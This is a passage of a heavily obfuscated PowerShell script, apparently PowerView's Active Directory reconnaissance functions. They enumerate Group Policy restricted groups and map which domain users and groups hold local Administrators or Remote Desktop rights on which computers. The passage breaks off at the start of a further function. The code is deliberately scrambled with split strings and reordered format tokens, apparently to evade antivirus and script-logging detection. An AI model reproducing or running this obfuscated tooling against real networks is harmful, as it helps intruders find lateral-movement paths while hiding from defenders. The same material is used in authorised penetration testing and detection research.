            ${ParS`Ear`Gs} =  @{ ("{0}{1}{2}"-f 'GptTm','plP','ath') = ("$GPOPath\MACHINE\Microsoft\Windows "+('NTL'+'xoSecEditLxoGp'+'tT'+'m'+'p'+'l'+'.inf').("{2}{1}{0}"-f 'LAcE','EP','r').Invoke('Lxo','\')) }
            if (${psbo`U`NDpAR`AM`etERS}[("{0}{2}{1}{3}" -f'C','edent','r','ial')]) { ${Pa`RsE`Ar`gS}[("{2}{0}{3}{1}" -f 'nti','l','Crede','a')] = ${cr`edE`N`TIAl} }

            ${i`Nf} = &("{2}{1}{0}"-f 'tTmpl','Gp','Get-') @ParseArgs

            if (${i`Nf} -and (${i`Nf}."pSBA`Se"."kE`Ys" -contains ("{0}{2}{1}{3}"-f'Grou','rshi','p Membe','p'))) {
                ${MemBERs`hi`pS} = @{}

                ForEach (${MeMb`E`RS`hIP} in ${I`Nf}.'Group Membership'.("{1}{2}{0}" -f'tor','GetEnum','era').Invoke()) {
                    ${gr`O`UP}, ${RE`laTiOn} = ${mem`B`eRS`HIp}."K`EY".("{0}{1}" -f 'S','plit').Invoke('__', ${SplI`Top`TIon}) | &("{0}{1}{2}" -f'ForEac','h-Ob','ject') {${_}.("{1}{0}" -f'rim','T').Invoke()}

                    ${ME`m`B`ERShIPvaL`UE} = ${mE`m`BER`ShiP}."V`ALuE" | &("{0}{3}{2}{1}" -f'Where-','ect','j','Ob') {${_}} | &("{0}{3}{2}{1}"-f 'F','ach-Object','rE','o') { ${_}.("{1}{0}"-f 'rim','T').Invoke('*') } | &("{1}{0}{2}" -f 're','Whe','-Object') {${_}}

                    if (${Ps`BO`UnDpAram`EtE`Rs}[("{2}{1}{0}{3}" -f'veMembersToSID','l','Reso','s')]) {

                        ${G`RoUpMeMb`ErS} = @()
                        ForEach (${mEM`BER} in ${Mem`Be`RsHIpva`LUE}) {
                            if (${mEM`BER} -and (${M`EMbER}.("{1}{0}"-f 'rim','T').Invoke() -ne '')) {
                                if (${ME`mb`er} -notmatch ("{0}{1}" -f '^S-1-.','*')) {
                                    ${C`onverTtoA`Rg`U`M`ents} = @{("{3}{0}{1}{2}"-f 'b','ject','Name','O') = ${meM`BeR}}
                                    if (${psBOu`ND`p`ARam`ETeRs}[("{0}{1}"-f 'Do','main')]) { ${cONv`ert`Toa`RgumEN`TS}[("{0}{1}"-f 'Doma','in')] = ${do`mA`iN} }
                                    ${MemBE`R`sId} = &("{3}{4}{2}{0}{1}" -f 'tT','o-SID','ver','C','on') @ConvertToArguments

                                    if (${MEM`B`E`RsId}) {
                                        ${g`ROup`Me`MBe`Rs} += ${MemB`e`RSiD}
                                    }
                                    else {
                                        ${Gr`oU`Pm`E`mBERS} += ${me`mB`Er}
                                    }
                                }
                                else {
                                    ${gROup`m`e`MBErs} += ${M`EMBer}
                                }
                            }
                        }
                        ${mEMbeRs`h`ipV`AlUe} = ${GR`o`Upme`mbErS}
                    }

                    if (-not ${ME`mberS`H`ips}[${G`ROuP}]) {
                        ${MEmb`E`RshipS}[${GrO`UP}] = @{}
                    }
                    if (${m`E`MBe`RsHiPVALUE} -isnot [System.Array]) {${mEM`BeRs`HiP`Val`Ue} = @(${MEmb`E`RShipva`l`UE})}
                    ${Mem`B`ErSh`ipS}[${Gr`o`UP}].("{0}{1}"-f 'A','dd').Invoke(${rE`lAt`iOn}, ${me`m`Be`R`ShIpValUe})
                }

                ForEach (${MeMBEr`sH`IP} in ${MeMBe`RSH`iPS}.("{1}{2}{4}{0}{3}"-f'o','GetEnum','era','r','t').Invoke()) {
                    if (${MEmbers`H`IP} -and ${M`eMb`ERshiP}."K`eY" -and (${MemB`ERS`hIp}."K`EY" -match '^\*')) {

                        ${G`RoupS`iD} = ${MEmbeRS`H`Ip}."k`ey".("{0}{1}" -f'T','rim').Invoke('*')
                        if (${G`RoUP`SId} -and (${g`ROU`PSiD}.("{1}{0}" -f'im','Tr').Invoke() -ne '')) {
                            ${g`ROUPNA`ME} = &("{1}{3}{4}{0}{2}"-f 'om-SI','C','D','on','vertFr') -ObjectSID ${G`RoUPSiD} @ConvertArguments
                        }
                        else {
                            ${gRoUp`N`Ame} = ${Fal`Se}
                        }
                    }
                    else {
                        ${gro`UpN`AME} = ${mEmb`E`R`shIp}."k`EY"

                        if (${GrOu`PN`AME} -and (${GRou`p`N`AME}.("{1}{0}" -f'rim','T').Invoke() -ne '')) {
                            if (${G`Ro`UpnAmE} -match ("{3}{1}{0}{4}{2}"-f 'tra','inis','s','Adm','tor')) {
                                ${GR`OUP`S`Id} = ("{3}{1}{2}{0}" -f'44','1','-5-32-5','S-')
                            }
                            elseif (${gr`O`UPnAMe} -match ("{4}{0}{2}{1}{3}"-f'mo','o','te Deskt','p','Re')) {
                                ${GR`oUP`SID} = ("{2}{1}{0}"-f '5','1-5-32-55','S-')
                            }
                            elseif (${GrO`UPN`AmE} -match ("{0}{1}" -f 'Gu','ests')) {
                                ${groUp`siD} = ("{1}{0}{2}"-f'32-54','S-1-5-','6')
                            }
                            elseif (${Gr`Oup`NAMe}.("{0}{1}"-f'T','rim').Invoke() -ne '') {
                                ${convErT`T`OAr`gUM`E`Nts} = @{("{1}{0}{2}" -f 'jec','Ob','tName') = ${Gro`Up`Name}}
                                if (${Psb`oU`NDPAR`A`MeTErS}[("{1}{2}{0}" -f 'ain','D','om')]) { ${coNvE`RtT`oA`RguMeN`TS}[("{1}{0}" -f 'omain','D')] = ${dO`Ma`iN} }
                                ${grOU`p`SiD} = &("{0}{1}{2}{3}"-f 'C','onvertTo-','SI','D') @ConvertToArguments
                            }
                            else {
                                ${gRo`U`PsiD} = ${Nu`Ll}
                            }
                        }
                    }

                    ${gp`og`RoUP} = &("{0}{1}{2}" -f 'Ne','w-Ob','ject') ("{2}{1}{0}"-f 'bject','SO','P')
                    ${g`PoG`RoUP} | &("{0}{1}{3}{2}" -f'A','dd-Me','r','mbe') ("{1}{2}{0}" -f'y','N','otepropert') ("{0}{1}{2}{3}"-f'GPODisplay','N','am','e') ${gp`odi`SplAyname}
                    ${Gpog`RO`Up} | &("{1}{0}{2}" -f 'Me','Add-','mber') ("{1}{2}{0}"-f 'eproperty','N','ot') ("{1}{0}" -f 'POName','G') ${gPO`NA`mE}
                    ${GpOg`R`oup} | &("{1}{0}{2}" -f'-Memb','Add','er') ("{2}{0}{1}" -f 'o','teproperty','N') ("{2}{0}{1}"-f 'OP','ath','GP') ${g`P`OPATH}
                    ${G`POG`Roup} | &("{2}{0}{1}" -f'dd-Me','mber','A') ("{0}{2}{1}{3}"-f 'N','teprope','o','rty') ("{0}{1}"-f'G','POType') ("{3}{1}{4}{2}{0}"-f's','tricte','roup','Res','dG')
                    ${gp`og`ROup} | &("{1}{2}{0}"-f'er','Add-','Memb') ("{2}{1}{0}" -f 'ty','roper','Notep') ("{1}{0}" -f 'lters','Fi') ${nu`lL}
                    ${GpO`G`RoUp} | &("{0}{3}{2}{1}"-f'Add-M','ber','m','e') ("{1}{2}{0}" -f'erty','Not','eprop') ("{1}{0}"-f'Name','Group') ${Gro`UP`NAme}
                    ${gp`oG`R`oUp} | &("{1}{0}{2}" -f '-Mem','Add','ber') ("{1}{0}{2}{3}" -f 'epro','Not','per','ty') ("{0}{2}{1}" -f 'Gr','upSID','o') ${gROu`P`S`Id}
                    ${Gp`OGR`oup} | &("{2}{3}{0}{1}" -f'b','er','Add-M','em') ("{0}{2}{1}{3}" -f'N','ro','otep','perty') ("{3}{1}{0}{2}" -f 'emb','pM','erOf','Grou') ${MemBE`R`shIp}."vAl`Ue"."MeMB`ER`of"
                    ${Gpog`ROUP} | &("{2}{0}{1}"-f 'e','mber','Add-M') ("{1}{0}{2}" -f 'ope','Notepr','rty') ("{1}{2}{3}{0}" -f 's','Group','Membe','r') ${ME`MbErsh`IP}."VaL`UE"."MEMBE`RS"
                    ${GPOgr`Oup}."pso`BJ`ECT"."tYPenAm`es".("{1}{0}"-f'ert','Ins').Invoke(0, ("{1}{2}{3}{0}"-f'OGroup','Po','wer','View.GP'))
                    ${gpo`gRo`UP}
                }
            }

            ${PAr`sear`Gs} =  @{
                ("{0}{1}{2}" -f 'Grou','psXMLp','ath') = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            &("{0}{2}{1}" -f 'Get-Gr','XML','oups') @ParseArgs | &("{1}{0}{2}{3}" -f'o','F','rEach-Obje','ct') {
                if (${pSBo`Un`Dpa`RAmetErS}[("{4}{5}{2}{0}{3}{1}"-f'sTo','s','er','SID','Resolv','eMemb')]) {
                    ${GR`oUpM`em`Bers} = @()
                    ForEach (${M`eMBEr} in ${_}."GrOU`PmE`mBE`Rs") {
                        if (${M`emBEr} -and (${MeM`BEr}.("{1}{0}" -f 'rim','T').Invoke() -ne '')) {
                            if (${MEm`BEr} -notmatch ("{2}{1}{0}" -f'*','-1-.','^S')) {

                                ${COnve`RT`TO`A`RG`UMeNTS} = @{("{1}{3}{0}{2}"-f 'm','Obj','e','ectNa') = ${GR`o`UPn`AmE}}
                                if (${PSB`O`UNDpArameTE`RS}[("{0}{1}" -f'Doma','in')]) { ${c`onVerTto`ARG`U`Me`NTs}[("{0}{1}" -f'Dom','ain')] = ${dOMA`In} }
                                ${m`EmBe`RSID} = &("{0}{1}{2}"-f'Conv','er','tTo-SID') -Domain ${D`oma`In} -ObjectName ${meMB`ER}

                                if (${MeMb`E`Rs`ID}) {
                                    ${gr`O`UPMemBErs} += ${me`MBE`Rsid}
                                }
                                else {
                                    ${gr`OuPM`e`MBeRs} += ${MEMB`ER}
                                }
                            }
                            else {
                                ${GRO`U`PM`eMBeRs} += ${M`Em`BeR}
                            }
                        }
                    }
                    ${_}."G`Ro`UpMemBErs" = ${g`R`O`UpMembErS}
                }

                ${_} | &("{3}{0}{1}{2}" -f'-M','e','mber','Add') ("{1}{3}{2}{0}" -f 'rty','Notep','pe','ro') ("{2}{1}{3}{4}{0}" -f 'me','Displ','GPO','ay','Na') ${gpo`Dis`PL`Ayn`AMe}
                ${_} | &("{1}{0}{2}"-f 'mbe','Add-Me','r') ("{1}{2}{0}{3}" -f 't','Note','proper','y') ("{0}{1}" -f 'GP','OName') ${gp`oNA`Me}
                ${_} | &("{0}{1}{2}"-f 'Ad','d-Me','mber') ("{1}{2}{0}"-f'eproperty','No','t') ("{1}{0}" -f 'POType','G') ("{3}{2}{1}{0}"-f 'ences','r','olicyPrefe','GroupP')
                ${_}."Ps`oB`jecT"."t`yPeNAMES".("{2}{0}{1}"-f 'e','rt','Ins').Invoke(0, ("{3}{2}{1}{0}" -f 'oup','Gr','werView.GPO','Po'))
                ${_}
            }
        }
    }
}

function get-`dOM`AIngPOuS`erlOc`Al`GRou`PmappiNG {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}"-f'ldProce','PS','Shou','ss'}, '')]
    [OutputType({"{1}{7}{2}{6}{8}{4}{9}{0}{5}{3}" -f 'oupMap','Pow','rView','ng','erLoca','pi','.G','e','POUs','lGr'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItIOn = 0, vALuEfrOMPIpEline = ${t`Rue}, VAlUeFrompIPELinEbYProPerTyname = ${tr`UE})]
        [Alias({"{4}{0}{2}{1}{3}"-f'istinguish','m','edNa','e','D'}, {"{3}{1}{2}{4}{0}" -f 'e','mA','ccountNa','Sa','m'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${I`DE`N`TIty},

        [String]
        [ValidateSet({"{3}{0}{2}{1}" -f 'mini','ators','str','Ad'}, {"{1}{0}{2}{3}"-f '-','S','1-5-3','2-544'}, 'RDP', {"{3}{1}{2}{0}"-f'ers','mote D','esktop Us','Re'}, {"{0}{2}{1}"-f 'S','1-5-32-555','-'})]
        ${L`o`CalgrOup} = ("{0}{4}{1}{2}{3}" -f 'Admini','a','t','ors','str'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`MaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'ADSP','ath'})]
        [String]
        ${SE`AR`Ch`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}"-f 'a','Dom','roller','inCont'})]
        [String]
        ${SE`R`VEr},

        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{2}{1}" -f'O','eLevel','n'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${SE`AR`ChSCo`pE} = ("{0}{1}"-f 'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESuL`TP`A`Ge`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERv`ERTIm`E`li`mit},

        [Switch]
        ${TOM`BSto`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`DENt`iAl} =   (&("{0}{2}{3}{1}" -f 'g','Ble','ET-','VAriA')  ("P"+"kfEzN")  )."v`AlUe"::"E`MPTY"
    )

    BEGIN {
        ${COm`mONARgUm`e`N`Ts} = @{}
        if (${p`SBouNDpARA`ME`TeRS}[("{0}{1}{2}"-f 'Doma','i','n')]) { ${cO`mM`onargum`en`Ts}[("{0}{1}" -f 'D','omain')] = ${Do`Ma`In} }
        if (${P`sBoUND`PARAme`T`eRS}[("{0}{1}" -f 'Serv','er')]) { ${ComMOnA`RGU`men`Ts}[("{2}{1}{0}" -f'r','e','Serv')] = ${seR`V`ER} }
        if (${PSbou`N`DPAR`A`mEtERS}[("{2}{0}{1}"-f 'hScop','e','Searc')]) { ${Co`Mm`ONA`RGUmeNTS}[("{1}{0}{2}" -f'chSco','Sear','pe')] = ${SE`Ar`ChScoPE} }
        if (${PsbOuN`d`PA`R`AmET`ERS}[("{0}{1}{3}{2}{4}"-f'Res','ult','Si','Page','ze')]) { ${cOM`Mon`A`RguME`NTs}[("{0}{2}{1}" -f 'Res','ageSize','ultP')] = ${Re`Su`ltP`A`gesizE} }
        if (${pSBoU`NDpA`Ram`ETe`RS}[("{2}{1}{3}{0}"-f'it','Time','Server','Lim')]) { ${cO`mmO`Nar`gumeNts}[("{1}{2}{0}{3}"-f'rverTim','S','e','eLimit')] = ${sER`V`eR`TImeL`iM`iT} }
        if (${pSBo`UN`dp`A`RA`MeteRs}[("{2}{0}{1}{3}" -f'mbs','t','To','one')]) { ${COMm`on`AR`GUMENtS}[("{1}{0}"-f'ombstone','T')] = ${T`oMBsTo`Ne} }
        if (${P`s`Bou`N`DPArAmEt`ERS}[("{0}{2}{1}"-f'Cr','ntial','ede')]) { ${c`ommoNAR`g`UmeNtS}[("{0}{1}{2}"-f'Cre','dentia','l')] = ${crE`dENTI`AL} }
    }

    PROCESS {
        ${t`ARge`TSids} = @()

        if (${psB`OU`NDparamETE`Rs}[("{1}{0}"-f 'tity','Iden')]) {
            ${tA`R`GE`TSiDs} += &("{1}{2}{0}{3}{4}" -f'ain','Get-Do','m','O','bject') @CommonArguments -Identity ${I`d`ENTity} | &("{3}{1}{0}{2}{4}" -f'e','el','ct-Obj','S','ect') -Expand ("{3}{1}{2}{0}" -f 'id','ct','s','obje')
            ${t`ArgetoB`jEc`TsId} = ${TAR`geTs`iDs}
            if (-not ${t`ArG`etsiDS}) {
                Throw ('['+'G'+'et-D'+'omainGP'+'OUserLo'+'calG'+'roup'+'Mapp'+'i'+'ng] '+'Un'+'able'+' '+'t'+'o '+'retr'+'ieve'+' '+'SI'+'D '+'f'+'or '+'ident'+'ity'+' '+"'$Identity'")
            }
        }
        else {

            ${TARgEtS`I`Ds} = @('*')
        }

        if (${LOc`AlGR`oUp} -match ("{0}{1}" -f 'S-1','-5')) {
            ${T`ARGeTlO`c`Als`id} = ${LoC`AlGRo`Up}
        }
        elseif (${lO`CalgR`ouP} -match ("{0}{1}" -f'Adm','in')) {
            ${TARgET`L`ocalS`ID} = ("{3}{1}{0}{2}" -f '32-','-5-','544','S-1')
        }
        else {

            ${Ta`R`g`etL`oCaLsiD} = ("{1}{3}{0}{2}"-f'-5-3','S','2-555','-1')
        }

        if (${ta`R`gE`TsIds}[0] -ne '*') {
            ForEach (${T`AR`GEt`sid} in ${t`Arg`eTsiDs}) {
                &("{3}{0}{1}{2}" -f 'rite-V','erb','ose','W') ('[Ge'+'t'+'-Domain'+'GPOUserLoc'+'alG'+'roupMapp'+'ing] '+'Enum'+'erat'+'i'+'ng '+'nes'+'t'+'ed '+'gr'+'oup '+'me'+'m'+'bershi'+'ps '+'for'+': '+"'$TargetSid'")
                ${t`ArgET`s`idS} += &("{3}{1}{2}{4}{0}" -f 'oup','Dom','ai','Get-','nGr') @CommonArguments -Properties ("{1}{0}"-f 'ectsid','obj') -MemberIdentity ${ta`R`GetS`ID} | &("{1}{3}{2}{0}"-f'ct','Sele','t-Obje','c') -ExpandProperty ("{2}{1}{0}"-f 'ctsid','bje','o')
            }
        }

        &("{1}{3}{0}{2}" -f 'bos','W','e','rite-Ver') ('[Get'+'-Domai'+'nG'+'P'+'OUse'+'r'+'LocalGr'+'o'+'upM'+'apping] '+'Ta'+'rge'+'t '+'lo'+'cal'+'g'+'roup '+'S'+'ID: '+"$TargetLocalSID")
        &("{2}{1}{0}{3}" -f 'o','erb','Write-V','se') ('[G'+'et-Doma'+'in'+'GPOUserL'+'o'+'calGr'+'oupMap'+'pi'+'ng] '+'Ef'+'f'+'e'+'ctive '+'targe'+'t '+'d'+'omai'+'n '+'SI'+'Ds'+': '+"$TargetSIDs")

        ${gp`Og`ROuPs} = &("{3}{5}{6}{0}{2}{1}{4}" -f'L','ou','ocalGr','Ge','p','t','-DomainGPO') @CommonArguments -ResolveMembersToSIDs | &("{0}{1}{2}"-f 'For','Each','-Object') {
            ${g`poGRo`Up} = ${_}

            if (${Gp`OG`ROuP}."gR`ouPSId" -match ${taRgetlOc`AL`S`id}) {
                ${gpOgr`OUP}."gRO`UPmE`mBerS" | &("{2}{1}{0}"-f 'bject','here-O','W') {${_}} | &("{0}{1}{2}" -f 'ForEac','h-Objec','t') {
                    if ( (${T`ArGetsI`DS}[0] -eq '*') -or (${ta`R`gE`TSIDs} -Contains ${_}) ) {
                        ${gP`OG`R`OUp}
                    }
                }
            }

            if ( (${gPOG`R`o`UP}."G`RouPM`embErof" -contains ${t`ARG`eTLoc`AlSId}) ) {
                if ( (${T`ARG`E`TSidS}[0] -eq '*') -or (${TArg`e`TSi`dS} -Contains ${gpO`gro`Up}."g`R`oUpsiD") ) {
                    ${g`PogRO`Up}
                }
            }
        } | &("{0}{1}{2}" -f'Sort-','O','bject') -Property ("{0}{1}"-f'GPONa','me') -Unique

        ${g`PO`groups} | &("{2}{1}{0}"-f '-Object','ere','Wh') {${_}} | &("{2}{1}{0}{3}"-f'je','b','ForEach-O','ct') {
            ${G`PoNa`ME} = ${_}."Gpo`displAynA`mE"
            ${gp`oG`Uid} = ${_}."gP`ONAMe"
            ${gp`oPaTh} = ${_}."gPOp`ATh"
            ${gPo`TY`pe} = ${_}."GPo`T`ypE"
            if (${_}."G`R`oupMEMBE`RS") {
                ${GP`oMe`MbERs} = ${_}."Gro`U`PmembE`RS"
            }
            else {
                ${GPOMEm`B`eRs} = ${_}."grOup`S`id"
            }

            ${FIlt`e`RS} = ${_}."F`ILTE`Rs"

            if (${Ta`R`geT`siDs}[0] -eq '*') {

                ${tarGEt`oBj`EcTsi`DS} = ${Gp`o`mem`BeRs}
            }
            else {
                ${TAR`GEt`Obj`eC`Ts`IdS} = ${t`ARgEt`oBj`ECtSiD}
            }

            &("{1}{2}{0}" -f'inOU','Get-Do','ma') @CommonArguments -Raw -Properties ("{4}{0}{5}{2}{3}{6}{1}" -f'in','name','ish','e','name,dist','gu','d') -GPLink ${G`pOg`UID} | &("{1}{0}{2}"-f'orEa','F','ch-Object') {
                if (${f`IlTe`Rs}) {
                    ${OUcom`PUT`eRs} = &("{5}{3}{1}{0}{4}{2}"-f 'omp','C','ter','ain','u','Get-Dom') @CommonArguments -Properties ("{4}{1}{3}{5}{0}{2}"-f 'ing','na','uishedname','me','dnshost',',dist') -SearchBase ${_}."P`ATh" | &("{2}{1}{0}" -f '-Object','here','W') {${_}."dIs`Ti`NguIsheDN`AMe" -match (${fi`L`TeRS}."VaL`Ue")} | &("{2}{3}{1}{0}"-f't-Object','c','Sel','e') -ExpandProperty ("{3}{2}{1}{0}"-f 'me','a','shostn','dn')
                }
                else {
                    ${OucOMp`U`Ters} = &("{5}{3}{2}{1}{4}{0}" -f 'puter','i','Doma','-','nCom','Get') @CommonArguments -Properties ("{1}{2}{0}" -f'me','dnshost','na') -SearchBase ${_}."pA`Th" | &("{0}{1}{3}{2}"-f'Sele','c','Object','t-') -ExpandProperty ("{3}{2}{0}{1}"-f 'ostna','me','h','dns')
                }

                if (${ou`C`omPUteRS}) {
                    if (${Ouco`m`pUt`ers} -isnot [System.Array]) {${oU`ComPuT`E`RS} = @(${O`UCO`M`PUTeRS})}

                    ForEach (${Ta`R`getSid} in ${TA`RgETObj`ECt`sI`Ds}) {
                        ${oB`j`eCT} = &("{0}{2}{3}{4}{1}" -f'Get-D','Object','o','ma','in') @CommonArguments -Identity ${tArG`e`TSID} -Properties ("{9}{15}{8}{10}{1}{3}{13}{14}{11}{0}{5}{2}{6}{4}{7}{12}" -f'n','pe,samacc','ishednam','ou','b','gu','e,o','jec','ccountt','s','y','isti','tsid','nt','name,d','ama')

                        ${is`GR`oUp} = @(("{2}{0}{1}" -f '6843','5456','2'),("{1}{0}{2}" -f '843','26','5457'),("{1}{2}{0}"-f'2','536870','91'),("{1}{0}{2}" -f '3687','5','0913')) -contains ${obj`eCt}."sa`M`ACC`Ountt`YPe"

                        ${gPOl`oc`A`LgROUp`m`ApPi`Ng} = &("{1}{2}{0}{3}" -f'-Objec','N','ew','t') ("{0}{1}{2}"-f'PS','Obje','ct')
                        ${G`po`LOc`ALg`RoUP`maPPING} | &("{2}{1}{0}" -f'-Member','d','Ad') ("{0}{1}{3}{2}"-f'Notepro','per','y','t') ("{2}{0}{1}" -f'jectNa','me','Ob') ${O`BJE`ct}."sa`MA`cCOUn`TNAmE"
                        ${gPO`L`oC`ALg`ROUpMA`pPiNG} | &("{2}{1}{0}" -f'ember','dd-M','A') ("{2}{1}{0}"-f 'ty','er','Noteprop') ("{2}{0}{1}"-f'ct','DN','Obje') ${Obj`Ect}."diST`I`Ng`UiSHEDnAMe"
                        ${GPOLoc`Al`g`Rou`PMaP`Ping} | &("{2}{0}{1}{3}"-f 'dd-M','embe','A','r') ("{3}{0}{1}{2}"-f'ote','proper','ty','N') ("{2}{0}{1}"-f 'j','ectSID','Ob') ${obJ`E`CT}."ObJ`Ec`T`SId"
                        ${GpO`LoCA`lGR`ou`PMapp`I`Ng} | &("{2}{0}{1}"-f'-Me','mber','Add') ("{0}{1}{3}{2}" -f 'No','te','roperty','p') ("{1}{0}"-f 'n','Domai') ${D`OM`Ain}
                        ${gpOL`OC`ALG`RoUp`MAP`pING} | &("{1}{2}{0}{3}" -f 'mbe','A','dd-Me','r') ("{2}{1}{3}{0}" -f'ty','otepro','N','per') ("{0}{2}{1}" -f'IsG','p','rou') ${i`sG`RouP}
                        ${G`pOlOc`AL`Grou`PMa`pPInG} | &("{2}{1}{0}" -f'r','-Membe','Add') ("{2}{1}{0}"-f 'rty','ope','Notepr') ("{1}{3}{0}{2}" -f 'playN','GP','ame','ODis') ${G`ponA`mE}
                        ${Gp`O`lOCAlGRoUpMa`P`pINg} | &("{1}{2}{0}" -f'er','Add-Mem','b') ("{0}{1}{2}"-f'No','tepro','perty') ("{0}{1}" -f'GPOG','uid') ${gP`o`gUiD}
                        ${gPoLoCalGR`OuPmAp`P`i`Ng} | &("{0}{1}{2}" -f 'Ad','d-Membe','r') ("{3}{1}{2}{0}"-f 'rty','epr','ope','Not') ("{2}{1}{0}"-f'h','OPat','GP') ${gpop`ATH}
                        ${GP`oLOCal`g`RoupmAppInG} | &("{1}{0}{2}"-f'm','Add-Me','ber') ("{1}{2}{0}{3}" -f 'roper','No','tep','ty') ("{1}{2}{0}" -f 'e','GPOTy','p') ${g`POT`yPE}
                        ${g`pOLOcA`lGROUPmAP`pI`Ng} | &("{0}{2}{1}" -f'A','er','dd-Memb') ("{0}{1}{3}{2}" -f'Not','ep','perty','ro') ("{2}{0}{1}{3}" -f'ainerNa','m','Cont','e') ${_}."P`RO`PERtIEs"."dis`TI`NG`U`iShedName"
                        ${gp`ol`oC`ALGRoUP`MaP`Pi`NG} | &("{1}{2}{0}" -f 'Member','Ad','d-') ("{2}{1}{0}" -f 'operty','epr','Not') ("{0}{3}{2}{1}" -f'Comp','me','rNa','ute') ${OU`COMp`Ut`ers}
                        ${Gp`OlOCA`l`GrouPM`App`INg}."P`SobjE`cT"."Ty`PeN`AM`Es".("{0}{1}" -f'Ins','ert').Invoke(0, ("{3}{2}{5}{0}{1}{4}" -f 'lGroup','Mapp','ew.GP','PowerVi','ing','OLoca'))
                        ${GpOloCAL`g`Ro`UP`mAPpInG}
                    }
                }
            }

            &("{1}{0}{2}"-f'DomainSit','Get-','e') @CommonArguments -Properties ("{5}{2}{4}{3}{0}{1}" -f'na','me','iteob','inguished','jectbl,dist','s') -GPLink ${g`P`oGUid} | &("{1}{2}{3}{0}" -f'ect','ForE','ach-O','bj') {
                ForEach (${ta`R`gets`iD} in ${TA`R`GeToBj`e`ctSIDs}) {
                    ${oB`JECt} = &("{3}{0}{1}{2}"-f 'inObje','c','t','Get-Doma') @CommonArguments -Identity ${t`ArGETs`ID} -Properties ("{2}{9}{11}{15}{0}{5}{3}{1}{14}{12}{8}{10}{13}{7}{6}{4}"-f'account','e,di','samaccoun','m','d','na','si','ct',',ob','ttype','j',',','ame','e','stinguishedn','sam')

                    ${ISG`RO`Up} = @(("{2}{0}{1}" -f'68','435456','2'),("{2}{1}{0}"-f '457','8435','26'),("{0}{1}" -f'5368709','12'),("{0}{1}{2}" -f'5','3','6870913')) -contains ${ObJ`ECt}."sAMACcOU`N`T`Ty`pe"

                    ${gp`oL`ocaLGrOuPm`ApP`inG} = &("{1}{0}{2}{3}"-f 'O','New-','b','ject') ("{0}{1}"-f 'PS','Object')
                    ${gpOLOCAL`g`R`OuP`MaPP`iNG} | &("{2}{1}{0}"-f 'er','-Memb','Add') ("{0}{2}{1}"-f 'N','perty','otepro') ("{1}{0}{2}"-f 'N','Object','ame') ${O`BJeCt}."saM`AccOUn`T`N`AmE"
                    ${gP`O`LOCAL`gR`o`U`pmAPpiNg} | &("{1}{2}{0}" -f 'mber','Ad','d-Me') ("{1}{0}{2}{3}" -f 't','No','epro','perty') ("{0}{1}" -f 'Ob','jectDN') ${O`BjE`ct}."DIS`TiNG`UisHed`NaME"
                    ${gP`Ol`oCal`groUpM`ApPINg} | &("{1}{2}{0}" -f'mber','Add','-Me') ("{3}{0}{1}{2}" -f'ot','eprope','rty','N') ("{2}{0}{1}" -f'ct','SID','Obje') ${Obj`eCT}."obJe`C`TSId"
                    ${GpOloca`lGr`oupmApp`iNG} | &("{2}{0}{1}{3}" -f '-','Me','Add','mber') ("{1}{2}{0}" -f'teproperty','N','o') ("{2}{0}{1}"-f 'r','oup','IsG') ${isgr`O`UP}
                    ${GPOl`OCaLg`RO`UpmAP`pI`NG} | &("{1}{0}{2}"-f'-Memb','Add','er') ("{3}{0}{1}{2}"-f 'ote','pro','perty','N') ("{0}{1}"-f'Doma','in') ${d`oMA`IN}
                    ${Gpol`ocalg`RoU`PMAp`PiNG} | &("{0}{2}{1}" -f'A','Member','dd-') ("{2}{3}{1}{0}"-f 'perty','epro','N','ot') ("{1}{3}{0}{2}"-f'a','GPO','yName','Displ') ${GpOn`AME}
                    ${g`PoLOcaL`GrOUpma`PPIng} | &("{0}{1}{2}" -f'Add','-Me','mber') ("{2}{0}{1}" -f 'rope','rty','Notep') ("{1}{0}"-f'Guid','GPO') ${G`Pog`UiD}
                    ${gp`OLo`calgRo`Up`mApPI`NG} | &("{0}{2}{3}{1}" -f 'Ad','ber','d','-Mem') ("{1}{0}{2}"-f 'otepropert','N','y') ("{0}{1}{2}"-f'GPOP','a','th') ${g`PO`PaTH}
                    ${Gpo`l`OcAL`Gr`OuP`MA`pPiNg} | &("{2}{1}{0}{3}" -f'd-Memb','d','A','er') ("{2}{1}{3}{0}" -f'rty','otep','N','rope') ("{0}{1}" -f 'GPOTy','pe') ${GPo`T`YpE}
                    ${g`POLoC`AlgRoUPMAp`pi`Ng} | &("{0}{2}{1}" -f'A','-Member','dd') ("{3}{2}{0}{1}"-f 'ert','y','rop','Notep') ("{2}{0}{1}{3}"-f'on','tain','C','erName') ${_}."D`istiNg`UIshEdNa`mE"
                    ${GPoL`OCAL`gRoupMaPPI`NG} | &("{0}{2}{1}" -f 'Add','er','-Memb') ("{2}{1}{0}"-f 'erty','teprop','No') ("{2}{0}{1}" -f 'erNa','me','Comput') ${_}."SitE`oBJec`TBL"
                    ${GP`oLO`CA`lGrOUpma`PpinG}."psO`BJE`cT"."t`YpenaM`Es".("{0}{1}" -f'A','dd').Invoke(("{3}{1}{0}{4}{2}"-f'GPOLocalG','.','g','PowerView','roupMappin'))
                    ${gP`olO`C`AlGRou`PM`APPiNG}
                }
            }
        }
    }
}

function GEt-Do`Maing`PoCoMPutERLoCA`l`gR`O`UPmAPpINg {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f'Sh','ouldProce','PS','ss'}, '')]
    [OutputType({"{4}{1}{7}{3}{0}{2}{6}{5}{8}"-f 'mputerLo','V','c','o','Power','b','alGroupMem','iew.GGPOC','er'})]
    [CmdletBinding(dEFaULTparAmETERSETNAme = {"{1}{0}{2}{3}" -f'mpu','Co','terId','entity'})]
    Param(
